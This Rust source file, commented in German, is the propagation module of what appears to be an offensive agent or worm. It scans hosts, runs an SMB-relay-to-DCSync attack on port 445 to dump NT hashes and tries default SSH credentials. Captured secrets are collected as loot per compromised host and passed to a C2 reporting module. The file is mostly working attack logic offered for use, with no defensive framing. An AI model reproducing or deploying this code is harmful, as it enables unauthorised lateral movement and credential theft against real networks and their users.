//! Propagationslogik: Scan → Service-Identifikation → Exploit.
//!
//! Führt einen TCP-Connect-Scan auf entdeckten Hosts aus, identifiziert die
//! Dienste über ein lokales Port-Mapping und versucht gezielte Exploits
//! (SMB-Relay für Windows/445, Credential-Stuffing für SSH).
//!
//! Jedes erbeutete Stück trägt die Kennung des Hosts, bei dem es erbeutet
//! wurde. Diese Information entsteht hier, während der Host im Scope ist —
//! weiter oben wäre sie verloren.
//!
//! Dieser Teil des Agenten **findet**, er meldet nicht. Das Ergebnis ist
//! ein Fund je Host: der Host und das, was auf ihm erbeutet wurde. Das
//! Melden liegt im Modul [`crate::meldung`] — dort steht auch die Reihenfolge
//! (erst der Host, dann seine Beute) und die Zählung.

use std::net::IpAddr;

use kx_core::c2;
use kx_core::secret::Secret;
use kx_exploit::{smb_relay_dcsync, try_default_credentials, RelayConfig};
use kx_scanner::{scan_tcp, DiscoveredHost, ScanResults};
use tracing::{debug, info, warn};

use crate::meldung::HostFund;

/// Die Ports, für die es eine Dienstzuordnung gibt.
///
/// Die Liste deckt genau die Ports ab, die der Scan tatsächlich prüft
/// (`kx_scanner::COMMON_PORTS`). Eine Zuordnung auf einen Port, der nie
/// gescannt wird, wäre wirkungslos.
const DIENSTE: &[(u16, &str)] = &[
    (22, "ssh"),
    (80, "http"),
    (135, "msrpc"),
    (443, "https"),
    (1433, "mssql"),
    (1521, "oracle"),
    (3306, "mysql"),
    (3389, "rdp"),
    (445, "smb"),
    (5432, "postgres"),
    (5900, "vnc"),
    (8080, "http-proxy"),
];

/// Mappt einen TCP-Port auf einen Dienstnamen (einfache Heuristik).
fn service_for_port(port: u16) -> &'static str {
    DIENSTE
        .iter()
        .find(|(p, _)| *p == port)
        .map(|(_, dienst)| *dienst)
        .unwrap_or("unknown")
}

/// Führt die vollständige Propagations-Schleife aus.
///
/// Liefert je Host einen Fund: der Host, sein Status und das, was auf ihm
/// erbeutet wurde. Der Master-Key des Hosts entsteht später, beim Melden —
/// hier wird er nicht gebraucht, und er gehört ohnehin zum Host, nicht zur
/// Beute.
pub async fn run_propagation(discovered: &[DiscoveredHost], relay_script: &str) -> Vec<HostFund> {
    let mut funde: Vec<HostFund> = Vec::new();
    if discovered.is_empty() {
        debug!("Keine Hosts entdeckt — Propagation beendet");
        return funde;
    }
    let ips: Vec<IpAddr> = discovered.iter().map(|h| h.ip).collect();
    info!("TCP-Scan auf {} Hosts", ips.len());
    let scan: ScanResults = scan_tcp(&ips, kx_scanner::COMMON_PORTS, 1000).await;
    for (host, ports) in &scan.open_ports {
        let host_id = host.to_string();
        let mut status = c2::STATUS_DISCOVERED.to_string();
        let mut os: Option<String> = None;
        let mut secrets: Vec<Secret> = Vec::new();
        for port in ports {
            let service = service_for_port(*port);
            info!("Offener Port {} auf {} ({})", port, host, service);
            // Windows + SMB (445) → SMB-Relay→DCSync.
            if *port == 445 {
                let relay_cfg = RelayConfig {
                    target: host_id.clone(),
                    script_path: relay_script.to_string(),
                    domain: None,
                    machine_account: None,
                    machine_hashes: None,
                };
                match smb_relay_dcsync(&relay_cfg).await {
                    Ok(creds) => {
                        info!("SMB-Relay: {} Credentials erbeutet", creds.len());
                        for c in creds {
                            secrets.push(Secret::new("nt_hash", &c.username, &c.hash, "smb_relay"));
                        }
                        status = c2::STATUS_COMPROMISED.to_string();
                        os = Some("Windows".into());
                    }
                    Err(e) => warn!("SMB-Relay fehlgeschlagen: {e}"),
                }
            }
            // SSH (22) → Default-Credentials.
            if service == "ssh" {
                if let Ok(Some(auth)) = try_default_credentials(&host_id, service).await {
                    secrets.push(Secret::new(
                        "password",
                        &auth.username,
                        &auth.password,
                        "default_creds",
                    ));
                    status = c2::STATUS_COMPROMISED.to_string();
                }
            }
        }
        // Jeden Host genau einmal melden. Vorher wurde er pro offenem Port
        // gepusht, wodurch ein späterer Eintrag mit Status `discovered` den
        // Status `compromised` überschrieb.
        funde.push(HostFund {
            host_id: host_id.clone(),
            ip: host_id,
            os,
            status,
            secrets,
        });
    }
    funde
}

#[cfg(test)]
mod tests {
    use super::*;
    use kx_scanner::COMMON_PORTS;

    /// Die Dienstzuordnung und die Scanliste sind deckungsgleich.
    ///
    /// Ein Port, den der Scan nicht prüft, kann nie im Ergebnis stehen — eine
    /// Zuordnung darauf wäre wirkungslos. Und ein gescannter Port ohne
    /// Zuordnung liefert `unknown`, obwohl ein Exploit-Pfad existiert.
    #[test]
    fn die_dienstzuordnung_entspricht_der_scanliste() {
        for (port, dienst) in DIENSTE {
            assert!(
                COMMON_PORTS.contains(port),
                "Dienstzuordnung {dienst} für Port {port}, aber der Port wird nicht gescannt"
            );
        }
        for port in COMMON_PORTS {
            assert!(
                DIENSTE.iter().any(|(p, _)| p == port),
                "Port {port} wird gescannt, hat aber keine Dienstzuordnung"
            );
        }
    }

    /// Der SMB-Port ist in der Scanliste und dem Mapping — sonst wäre der
    /// Relay-Zweig toter Code.
    #[test]
    fn der_smb_port_wird_gescannt_und_ist_zugeordnet() {
        assert!(COMMON_PORTS.contains(&445));
        assert_eq!(service_for_port(445), "smb");
    }
}
